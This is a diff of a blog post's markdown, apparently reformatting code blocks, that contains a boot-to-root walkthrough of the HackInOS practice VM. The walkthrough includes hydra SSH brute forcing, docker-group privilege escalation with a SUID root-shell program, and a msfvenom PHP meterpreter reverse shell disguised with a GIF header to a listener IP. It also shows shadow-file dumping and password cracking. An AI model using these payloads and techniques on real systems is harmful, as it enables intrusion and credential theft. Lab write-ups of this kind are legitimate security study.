@@ -24,7 +24,8 @@ Since this is just a "boot to root", not a full pentest, we jump right into enum
 
 I typically do nmap from within metaspolit so I can save the info in the workspace and get to it easily. Since we don't have to worry about detection, I did a very aggressive nmap to enumerate the target.
 
-```
+{{< highlight markdown >}}
+
 msf5 > db_nmap -sV -O -A -p- target
 [*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-21 19:12 EDT
 [*] Nmap: Nmap scan report for hackin (192.168.167.132)
@@ -56,7 +57,8 @@ msf5 > db_nmap -sV -O -A -p- target
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.29 seconds
 
-```
+
+{{< / highlight >}}
 
 As usual, nmap provides a helpful starting point. We also ran a similar UDP scan, but that didn't turn up anything interesting so it has been omitted. From here, we started to drill down on the two exposed services.
 
@@ -64,12 +66,14 @@ As usual, nmap provides a helpful starting point. We also ran a similar UDP scan
 
 We can get some hints from `robots.txt`
 
-```
+{{< highlight markdown >}}
+
 root@kali:~# curl target:8000/robots.txt
 User-agent:*
 Disallow:/upload.php
 Disallow:/uploads
-```
+
+{{< / highlight >}}
 
 We took a closer look at the disallowed entries, and found some interesting stuff; `upload.php` has an html comment in it:[https://github.com/fatihhcelik/Vulnerable-Machine---Hint](https://github.com/fatihhcelik/Vulnerable-Machine---Hint)
 
@@ -105,9 +109,11 @@ Everyone's favorite blogging platform has had it's share of exploits over the ye
 
 Browsing to the site, it looked very broken. This is because of a common configuration error in wordpress, where the install URL is configured as "localhost". To fix things up, I started a local port redirect with socat:
 
-```
+{{< highlight markdown >}}
+
 socat tcp-listen:8000,reuseaddr,fork tcp:target:8000
-```
+
+{{< / highlight >}}
 
 This made it possible to follow links and explore manually, and fixed the style errors as well.
 
@@ -115,7 +121,8 @@ Manual discovery and attacking is great, but there'a tools to make this easier; 
 
 After a couple wpscan runs, we had a lot more detail about this WP install to use for attacking, and a user (although we already discovered that user manually).
 
-```
+{{< highlight markdown >}}
+
 root@kali:~# wpscan --url http://target:8000/ --wp-content-dir /                                                                                                                                                                                                                          
 _______________________________________________________________                                                                                                                                                                                                                           
         __          _______   _____                                                                                                                                                                                                                                                       
@@ -204,11 +211,13 @@ Interesting Finding(s):
 [+] Data Received: 18.762 KB
 [+] Memory used: 138.477 MB
 [+] Elapsed time: 00:00:01
-```
+
+{{< / highlight >}}
 
 And here's our wordpress user:
 
-```
+{{< highlight markdown >}}
+
 root@kali:~# wpscan --url http://target:8000/ --wp-content-dir / --enumerate u 
 
 ...snip...
@@ -219,7 +228,8 @@ root@kali:~# wpscan --url http://target:8000/ --wp-content-dir / --enumerate u
  | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  | Confirmed By: Login Error Messages (Aggressive Detection)
 
-```
+
+{{< / highlight >}}
 
 Surely, a username like that is some kind of clue.I started poking wordpress manually, and tried to register, but registration was not enabled. I also tried to post replies to existing comments to see if we could use that for the CSRF vulnerability wpscan found, but although my posts seemed successful, they were not visible, which means that CSRF would not work, since it needs a page load to occur for the CSRF to run. While it is already in the wpscan output above, I think it's worthwhile to point out [this blog post](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/); it's an excellent write up.SSH
 
@@ -229,7 +239,8 @@ I didn't feel like we were making progress with the HTTP based attacks, so I dec
 
 The box boots to a login screen that shows a valid user. I decided to plug this user into hydra and attack SSH, and it payed off after just a few seconds.
 
-```
+{{< highlight markdown >}}
+
 root@kali:~# hydra -l hummingbirdscyber -P /usr/share/wordlists/rockyou.txt -t4 target ssh 
 Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -241,7 +252,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-22 20:10:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-22 20:10:43
 root@kali:~# 
-```
+
+{{< / highlight >}}
 
 Well ok, I'll take an unprivileged shell. Thanks, Hydra!`[22][ssh] host: target   login: hummingbirdscyber   password: 123456`
 
@@ -249,7 +261,8 @@ Well ok, I'll take an unprivileged shell. Thanks, Hydra!`[22][ssh] host: target 
 
 Now we had an unprivileged shell, and it was time to do some additional enumeration. I started by grabbing /etc/passwd and checking the user's group memberships.
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -299,11 +312,13 @@ hummingbirdscyber@vulnvm:~$ grep -vP 'nologin|false' /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 sync:x:4:65534:sync:/bin:/bin/sync
 hummingbirdscyber:x:1000:1000:hummingbirdscyber,,,:/home/hummingbirdscyber:/bin/bash
-```
+
+{{< / highlight >}}
 
 I also poked around the user's home directory for things of interest:
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ stat .sudo_as_admin_successful
   File: '.sudo_as_admin_successful'
   Size: 0               Blocks: 0          IO Block: 4096   regular empty file
@@ -317,11 +332,13 @@ hummingbirdscyber@vulnvm:~$ sudo -l
 [sudo] password for hummingbirdscyber: 
 
 Sorry, user hummingbirdscyber may not run sudo on vulnvm.
-```
+
+{{< / highlight >}}
 
 I decided I wanted to speed things up a bit, and found a neat tool in this ["total OSCP guide"](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html), called [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh). I read that, put it on the target machine, ran it, and read through the output. I found some interesting stuff there. Rather than paste all the output, here's the two things that jumped out at me:
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ ls Desktop/a.out -l 
 -rwsr-xr-x 1 root root 8720 Mar  1 23:25 Desktop/a.out
 hummingbirdscyber@vulnvm:~$ 
@@ -329,7 +346,8 @@ hummingbirdscyber@vulnvm:~$
 
 hummingbirdscyber@vulnvm:~$ id
 uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
-```
+
+{{< / highlight >}}
 
 I already saw that `hummingbirdscyber` was a member of the `docker` group, but I missed the `adm` membership. I tried some additional find commands to look for SUID files I could abuse with `-gid 4`, but no luck. It's also worth mentioning that the output led me to look for gcc, which was installed.
 
@@ -337,13 +355,15 @@ I already saw that `hummingbirdscyber` was a member of the `docker` group, but I
 
 With membership in the `docker` group, we could really dig into the containers on this box and see if we can abuse that privilege for gain. We start again, with more enumeration:
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker ps
 CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES
 252fa8cb1646        ubuntu              "/bin/bash"              8 weeks ago         Up 19 minutes                              brave_edison
 1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   8 weeks ago         Up 19 minutes       0.0.0.0:8000->80/tcp   experimental_wordpress_1
 81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   8 weeks ago         Up 19 minutes       3306/tcp, 33060/tcp    experimental_db_1
-```
+
+{{< / highlight >}}
 
 This really helped to bring the environment into focus for me. All the stuff we were hammering on via HTTP lived in a container; remember that username hint, `handsome_container`?
 
@@ -351,7 +371,8 @@ This really helped to bring the environment into focus for me. All the stuff we 
 
 I started with this container, since I suspected it would be the most "complete" environment. Once I exec'd into the container, I started to get a clearer picture of what we were working with. I looked at the running processes and started poking things:
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker exec -it brave_edison /bin/bash
 root@252fa8cb1646:/# cat /etc/init.d/port.sh 
 #!/bin/bash
@@ -387,7 +408,8 @@ root@252fa8cb1646:/# ls /home/hint
 root@252fa8cb1646:/# cat /home/hint 
 Startup Script?
 root@252fa8cb1646:/# 
-```
+
+{{< / highlight >}}
 
 This output made me start thinking that perhaps direct ssh was not the vulnerable machine's common ingress point, and that maybe I should not have used the visible username to my advantage to get a foothold. I also thought "why turn back now that I already have a shell?" a few seconds later.
 
@@ -395,7 +417,8 @@ This output made me start thinking that perhaps direct ssh was not the vulnerabl
 
 Oh boy. With a name like that, this thing must be swiss cheese, right?
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker exec -it experimental_wordpress_1 /bin/bash
 root@1afdd1f6b82c:/var/www/html# ls
 index.php    robots.txt  wp-activate.php     wp-comments-post.php  wp-content	wp-links-opml.php  wp-mail.php	    wp-trackback.php
@@ -418,11 +441,13 @@ root@1afdd1f6b82c:/var/www/html# cd uploads/
 root@1afdd1f6b82c:/var/www/html/uploads# ls 
 476ce8b1f89f8e46c4087d7b524eabee.gif
 root@1afdd1f6b82c:/var/www/html/uploads# 
-```
+
+{{< / highlight >}}
 
 Kinda. It was trivial to get the wordpress db creds, and this is how I confirmed the location of my test upload. We tried re-implementing the php move of the `uploads.php` in bash earlier, and then started using php from the cli to guess paths. We weren't sure if we were right about the renaming until I got into this container and confirmed it.That doesn't do us much good though, since we didn't have a payload that would pass the mime type check to upload, and even if we did, it would get us access to a container where we already had access!I kept looking and saw another clue to the same moot point:
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker exec  -it experimental_wordpress_1 /bin/bash
 root@1afdd1f6b82c:/var/www/html# ps -ef  
 UID         PID   PPID  C STIME TTY          TIME CMD
@@ -450,22 +475,26 @@ do
     rm -rf /var/www/html/uploads/*.php
     sleep 300
 done
-```
+
+{{< / highlight >}}
 
 Again, I thought that we were probably intended to get a foothold through HTTP. Oh well.
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker exec -it experimental_wordpress_1 /bin/bash
 root@1afdd1f6b82c:/var/www/html# cd /root/
 root@1afdd1f6b82c:~# ls
 flag
 root@1afdd1f6b82c:~# cat flag 
 Life consists of details..
-```
+
+{{< / highlight >}}
 
 Poking around some more got me some more fortune cookie wisdom and a lot of nothing. I grabbed passwd and shadow for kicks.
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker exec -it experimental_wordpress_1 /bin/bash
 root@1afdd1f6b82c:/var/www/html# cat /etc/shadow
 root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
@@ -508,16 +537,19 @@ irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/bin/false
-```
+
+{{< / highlight >}}
 
 I thought "no way are these mapped to actual system files", and I was right.
 
-```
+{{< highlight markdown >}}
+
 root@kali:~/hackinos# john --show unshadowed
 root:john:0:0:root:/root:/bin/bash
 
 1 password hash cracked, 0 left
-```
+
+{{< / highlight >}}
 
 I tried using that to become root on the host, but that didn't work. duh.
 
@@ -525,7 +557,8 @@ I tried using that to become root on the host, but that didn't work. duh.
 
 I started out by poking around the database with the creds we harvested from the wordpress container.
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker exec -it experimental_db_1 /bin/bash
 
 root@81a93420fd22:/# mysql -u wordpress -p wordpress 
@@ -595,7 +628,8 @@ user_activation_key:
         user_status: 0
        display_name: Handsome_Container
 1 row in set (0.00 sec)
-```
+
+{{< / highlight >}}
 
 It won't get us anything, but let's get access to wordpress for fun!
 
@@ -607,7 +641,8 @@ Here's some articles I found to help craft the right queries and hash a password
 
 [https://www.wpbeginner.com/wp-tutorials/how-to-add-an-admin-user-to-the-wordpress-database-via-mysql/](https://www.wpbeginner.com/wp-tutorials/how-to-add-an-admin-user-to-the-wordpress-database-via-mysql/)
 
-```
+{{< highlight markdown >}}
+
 root@kali:~# cat wordpress-add-admin-user.sql
 INSERT INTO `wordpress`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('2', 'attacker', '$P$BQz2Dd0FIn7hf90kXbo2G2uwiMCgTH.', 'Real Mature', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Real Mature');
  
@@ -624,7 +659,8 @@ Query OK, 1 row affected (0.01 sec)
 
 mysql> INSERT INTO `wordpress`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '2', 'wp_user_level', '10');
 Query OK, 1 row affected (0.00 sec)
-```
+
+{{< / highlight >}}
 
 {{< figure src="/content/images/2019/04/Screenshot-from-2019-04-22-20-50-31.png" >}}
 
@@ -638,11 +674,13 @@ With the access to all the containers, and wordpress, we could easily execute th
 
 We found some (probably false) flags and a lot of hints. Remember this one?
 
-```
+{{< highlight markdown >}}
+
 root@252fa8cb1646:/# cat /home/hint 
 Startup Script?
 root@252fa8cb1646:/#
-```
+
+{{< / highlight >}}
 
 I decided to poke at the startup scripts in the containers, which is how I discovered ubuntu and wordpress were connected. We could easily edit the startup scripts in the containers, but again we gain nothing. I started looking at startup scripts on the host itself and found a bunch with `docker exec $something`. I decided to keep thinking about abusing docker. I tried some things. Some were dumb, many were pointless. I finally started looking back at regular old privesc on the host itself. I tried a kernel exploit, and it failed. I looked at SUID binaries again, and that's when I realized something that had been staring me in the face for a while.
 
@@ -650,7 +688,8 @@ Earlier, when I found the SUID binary in the user's home, `~/Desktop/a.out`, I c
 
 I also tried compiling an exploit for SUID myself at that time, but as an unprivileged user, you can't chown things to root.
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ cat exploit.c 
 #include <stdio.h>
 #include <stdlib.h>
@@ -663,7 +702,8 @@ int main()
     system("/bin/bash");
     return 0;
 }
-```
+
+{{< / highlight >}}
 
 I built/linked it with gcc, which was already installed:
 
@@ -673,7 +713,8 @@ Since I could chmod 4777 for SUID, but couldn't chown root:root first, I gave up
 
 We had root on all the docker containers, so all I needed to do was reuse an image that's already on the box (because no internet access), and create a bind mount to abuse the docker privileges.
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker run -v $(pwd)/persist:/persist --name persist -d ubuntu:latest sleep 600 
 d407a4a053b1513742ea6908887c1f8c97f5667f82a2afcce28ecb01c6b3fd4c
 hummingbirdscyber@vulnvm:~$ docker ps
@@ -683,11 +724,13 @@ d407a4a053b1        ubuntu:latest       "sleep 600"              1 second ago   
 1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   8 weeks ago         Up 13 hours         0.0.0.0:8000->80/tcp   experimental_wordpress_1
 81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   8 weeks ago         Up 13 hours         3306/tcp, 33060/tcp    experimental_db_1
 
-```
+
+{{< / highlight >}}
 
 Then we copy the exploit to the dir we used for our bind mount, and `docker exec` to get into the container and access the bind mount as root, and chown/chmod appropriately. This change persists to the host, so next we simply exit the container and execute the malicious SUID binary as our unprivileged user and become root.
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ docker exec -it persist /bin/bash
 root@d407a4a053b1:/# cd /persist/
 root@d407a4a053b1:/persist# ls -l 
@@ -701,21 +744,25 @@ total 12
 
 -rwsrwxrwx 1 root root 8656 Apr 23 07:57 exploit
 root@d407a4a053b1:/persist# exit
-```
+
+{{< / highlight >}}
 
 From our unprivileged shell:
 
-```
+{{< highlight markdown >}}
+
 hummingbirdscyber@vulnvm:~$ cd persist/
 hummingbirdscyber@vulnvm:~/persist$ ./exploit 
 root@vulnvm:~/persist# id
 uid=0(root) gid=4(adm) groups=4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker),1000(hummingbirdscyber)
 root@vulnvm:~/persist# 
-```
+
+{{< / highlight >}}
 
 I grabbed `/etc/shadow` and poked around a bit, but I didn't find anything new or exciting, so let's grab the flag.
 
-```
+{{< highlight markdown >}}
+
 root@vulnvm:~# cd /root/
 root@vulnvm:/root# ls
 flag
@@ -747,7 +794,8 @@ Congratulations!
                                  `.     `                    
 root@vulnvm:/root# 
 
-```
+
+{{< / highlight >}}
 
 ## Denouement
 
@@ -765,13 +813,15 @@ After publishing this post, I decided that I was not happy with the way I left t
 
 I ran nikto and found this clue to help me:
 
-```
+{{< highlight markdown >}}
+
 Very early in the output I saw this gem we can use for php hax:
 
 
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 
-```
+
+{{< / highlight >}}
 
 I dug around a lot and ended up revisiting some HTTP fundamentals, and also learning a few things about the GIF format.
 
@@ -779,7 +829,8 @@ I dug around a lot and ended up revisiting some HTTP fundamentals, and also lear
 
 Let's make a payload with msfvenom for a reverse_tcp meterpreter shell:
 
-```
+{{< highlight markdown >}}
+
 root@kali:~/hackinos# msfvenom -p php/meterpreter/reverse_tcp  LHOST=192.168.167.130 LPORT=4444 -o revtcp.php
 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
 [-] No arch selected, selecting arch: php from the payload
@@ -787,24 +838,29 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 1116 bytes
 Saved as: revtcp.php
 root@kali:~/hackinos# 
-```
+
+{{< / highlight >}}
 
 Then you prepend the gif filetype header "GIF89a;" to the payload make it pass the php image check:
 
-```
+{{< highlight markdown >}}
+
 root@kali:~/hackinos# cat gifrevtcp.php
 GIF89a;
 /*<?php /**/ error_reporting(0); $ip = '192.168.167.130'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
-```
+
+{{< / highlight >}}
 
 Next, we submit the payload with curl; it's also possible to do this via the browser, which I discovered only after working out the proper curl command:
 
-```
+{{< highlight markdown >}}
+
 root@kali:~/hackinos# curl -H"Content-Type: multipart/form-data" -F "file=@gifrev.php;type=image/gif" -F"submit=Submit"  http://target:8000/upload.php -iv --show-error --fail 2>&1 | grep -i upload
                                  Dload  Upload   Total   Spent    Left  Speed
 > POST /upload.php HTTP/1.1
 File uploaded /uploads/?
-```
+
+{{< / highlight >}}
 
 ### Set Up a Handler
 
@@ -812,7 +868,8 @@ Setting LHOST/LPORT is pretty obvious, but it is also absolutely crucial to set 
 
 Then set options as normal:
 
-```
+{{< highlight markdown >}}
+
 setting LHOST/LPORT is pretty obvious, but it is also absolutely crucial to set the payload to match what we generated with msfvenom:
 
 msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
@@ -843,19 +900,22 @@ Exploit target:
 
 
 msf5 exploit(multi/handler) > run
-```
+
+{{< / highlight >}}
 
 run/exploit here starts the handler listening
 
 ### Brute Force the Filename
 
-```
+{{< highlight markdown >}}
+
 root@kali:~/hackinos# cat fname.php 
 for ($n = 1; $n <= 100 ; $n++ ) {
         $target_file = "uploads/". md5(basename("gifrev.php" . $n));
         echo "$target_file" . ".php" . "\n";
 }
-```
+
+{{< / highlight >}}
 
 So doing this will give us a list of 100 relative URLs:
 
@@ -867,7 +927,8 @@ and doing this will curl all of them; when we hit the one that was generated wit
 
 ### Getting a Meterpreter Session
 
-```
+{{< highlight markdown >}}
+
 msf5 exploit(multi/handler) > run                                                            
 [*] Started reverse TCP handler on 192.168.167.130:4444                                                                                                                                 
 [*] Sending stage (38247 bytes) to 192.168.167.132                                                                                                                                      
@@ -908,7 +969,8 @@ ls
 58e09caa30987a8bcff859ef289fddf9.gif
 www-data@1afdd1f6b82c:/var/www/html/uploads$ 
 
-```
+
+{{< / highlight >}}
 
 Here, you can see where I was uploading actual gif files to figure this stuff out before trying with a shell. Although not explicitly shown here, there is a job that wipes all `*.php` files from the uploads directory every 300 seconds, so you have to get your payload in and execute it fairly quickly, since your payload might land within a few seconds before the delete job executes.
 
@@ -916,7 +978,8 @@ Here, you can see where I was uploading actual gif files to figure this stuff ou
 
 From here, you can get the db creds out of `wp-config.php`. Once connected, you can also get host credentials.
 
-```
+{{< highlight markdown >}}
+
 www-data@1afdd1f6b82c:/var/www/html$ mysql -u wordpress -p -h db wordpress
 mysql -u wordpress -p -h db wordpress
 Enter password: wordpress
@@ -964,11 +1027,13 @@ select * from host_ssh_cred;
 1 row in set (0.00 sec)
 
 MySQL [wordpress]> 
-```
+
+{{< / highlight >}}
 
 Cracking this with john the ripper is trivial:
 
-```
+{{< highlight markdown >}}
+
 root@kali:~/hackinos# cat mysql.txt 
 hummingbirdscyber:e10adc3949ba59abbe56e057f20f883e
 root@kali:~/hackinos# john --format=Raw-MD5  mysql.txt
@@ -980,7 +1045,5 @@ hummingbirdscyber:123456
 
 1 password hash cracked, 0 left
 root@kali:~/hackinos# 
-```
 
-We can use this to SSH to the host and then escalate privileges via docker to gain root, as in the original post.
-
+{{< / highlight >}}
